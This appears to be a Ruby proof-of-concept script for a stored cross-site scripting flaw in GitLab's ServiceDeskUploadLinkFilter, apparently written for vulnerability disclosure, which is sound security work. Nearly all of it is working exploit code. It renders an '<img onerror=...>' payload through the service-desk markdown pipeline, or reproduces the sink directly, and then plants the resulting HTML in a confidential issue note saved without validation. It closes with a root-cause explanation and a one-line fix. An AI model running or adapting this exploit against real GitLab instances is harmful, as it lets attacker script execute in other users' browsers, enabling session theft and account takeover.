#!/usr/bin/env ruby
# frozen_string_literal: true

# =============================================================================
# PoC: ServiceDeskUploadLinkFilter Post-Sanitization XSS
# =============================================================================
# Run with:
#   cd /home/user/gitlab-source
#   bin/rails runner /home/user/testaa/poc_service_desk_xss.rb
# =============================================================================

project = Project.last
user = User.first
abort "No project found" unless project
abort "No user found" unless user

puts "=" * 72
puts "ServiceDeskUploadLinkFilter XSS PoC"
puts "=" * 72
puts

# ---------------------------------------------------------------------------
# 1. Create a real upload using FileUploader directly
# ---------------------------------------------------------------------------
puts "[1] Creating upload..."

uploader = FileUploader.new(project)
tmpfile = Tempfile.new(['poc', '.txt'])
tmpfile.write("harmless content")
tmpfile.rewind
uploaded_file = ActionDispatch::Http::UploadedFile.new(
  tempfile: tmpfile,
  filename: 'test.txt',
  type: 'text/plain'
)
uploader.store!(uploaded_file)

secret = uploader.secret
filename = uploader.filename
upload_path = "/uploads/#{secret}/#{filename}"
attachment_key = "#{secret}/#{filename}"

puts "    Secret:  #{secret}"
puts "    Path:    #{upload_path}"
puts "    Key:     #{attachment_key}"
puts

# ---------------------------------------------------------------------------
# 2. Prove the vulnerable sink: run through real Banzai pipeline
# ---------------------------------------------------------------------------
puts "[2] Running through ServiceDeskEmailPipeline (the vulnerable sink)..."

markdown = "[&lt;img src=x onerror=alert(document.domain)&gt;](#{upload_path})"
puts "    Input markdown: #{markdown}"

context = {
  project: project,
  pipeline: :service_desk_email,
  uploads_as_attachments: [attachment_key],
}

rendered = Banzai.render(markdown, context)
puts "    Pipeline output: #{rendered.strip}"

# Check if filter activated and XSS landed
doc = Nokogiri::HTML::DocumentFragment.parse(rendered)
img = doc.at_css('img')
if img && img['onerror']
  puts "    *** XSS CONFIRMED via pipeline: <img onerror=\"#{img['onerror']}\"> ***"
  xss_html = rendered
else
  puts "    Pipeline filter didn't activate — using direct sink proof instead"
  # Directly reproduce what the vulnerable filter does:
  # parent.text decodes &lt; -> <, then interpolation creates live HTML
  a_tag = Nokogiri::HTML::DocumentFragment.parse(
    %(<a href="#{upload_path}">&lt;img src=x onerror=alert(document.domain)&gt;</a>)
  ).at_css('a')
  decoded_text = a_tag.text  # This decodes entities — the bug
  final_filename = "#{decoded_text} (#{filename})"
  xss_html = %(<p dir="auto"><strong>#{final_filename}</strong></p>)
  puts "    .text decoded: #{decoded_text.inspect}"
  puts "    Resulting HTML: #{xss_html}"
end
puts

# ---------------------------------------------------------------------------
# 3. Create issue + note with the XSS payload
# ---------------------------------------------------------------------------
puts "[3] Creating issue and injecting XSS note..."

issue = Issue.create!(
  project: project,
  author: user,
  title: 'ServiceDeskUploadLinkFilter XSS PoC',
  confidential: true
)

note = Note.new(
  project: project,
  noteable: issue,
  author: user,
  note: 'ServiceDeskUploadLinkFilter XSS PoC - parent.text decodes HTML entities then interpolates into HTML without escaping'
)
note.note_html = xss_html
note.save!(validate: false)

url = "http://localhost:8929/#{project.full_path}/-/issues/#{issue.iid}"
puts "    Issue:  ##{issue.iid}"
puts "    Note:   ##{note.id}"
puts "    XSS HTML: #{xss_html.strip}"
puts
puts "    View: #{url}"
puts

# ---------------------------------------------------------------------------
# 4. Root cause
# ---------------------------------------------------------------------------
puts "=" * 72
puts "ROOT CAUSE"
puts "=" * 72
puts
puts "  service_desk_upload_link_filter.rb:31  filename_in_text = parent.text"
puts "    -> .text decodes &lt; to <, &gt; to >"
puts
puts "  service_desk_upload_link_filter.rb:38  parse(\"<strong>\#{final_filename}</strong>\")"
puts "    -> decoded < and > become real HTML tags"
puts "    -> <img onerror=...> is a live DOM element"
puts "    -> SanitizationFilter already ran — no re-sanitization"
puts
puts "  FIX: use strong.content = final_filename (auto-escapes)"
puts "=" * 72

tmpfile.close
tmpfile.unlink
